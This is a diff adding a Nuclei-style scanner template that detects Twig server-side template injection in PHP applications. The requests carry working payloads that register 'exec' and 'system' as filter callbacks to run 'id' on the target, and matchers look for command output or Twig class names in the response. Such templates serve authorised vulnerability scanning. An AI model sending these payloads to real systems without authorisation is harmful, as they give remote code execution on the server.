@@ -1,0 +1,27 @@
+id: m7-ssti-twig
+info:
+  name: M7 - SSTI Twig RCE (PHP)
+  author: Sharlix
+  severity: critical
+  description: Twig template engine SSTI leading to RCE on PHP applications
+  tags: ssti,twig,php,rce,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+      - "{{BaseURL}}?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+      - "{{BaseURL}}?q={{7*7}}{{dump(app)}}"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\d+\(.*?\)"
+        part: body
+
+      - type: word
+        words:
+          - "Twig_Environment"
+          - "__TwigTemplate"
+        part: body
